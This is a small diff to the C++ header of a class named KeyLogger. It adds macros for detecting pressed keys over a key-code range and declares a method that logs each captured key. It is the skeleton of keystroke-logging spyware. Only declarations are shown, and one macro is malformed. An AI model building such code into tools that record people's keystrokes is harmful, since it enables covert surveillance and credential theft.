@@ -8,6 +8,12 @@
 #include <string>
 #include "LogStrategy.h"
 
+#define IS_PRESSED -32767 // -((2^15) - 1) 
+#define START_KEY 8 // ascii code for backspace
+#define END_KEY 237 // some greek letter
+#define RELEVANT_INTERVAL_OF_KEYS (START_KEY END_KEY)
+#define PAUSE 10
+
 class KeyLogger {
     private:
         LogStrategy* logStrategy;  // Pointer to the logging strategy
@@ -26,6 +32,9 @@ class KeyLogger {
 
         // Opens the log file; returns true if successful, false otherwise
         bool openLogFile(const std::string &filename);
+
+        // write in the log based on a specific strategy
+        void logKey(char);
 
         // Starts the keylogger loop
         void start();
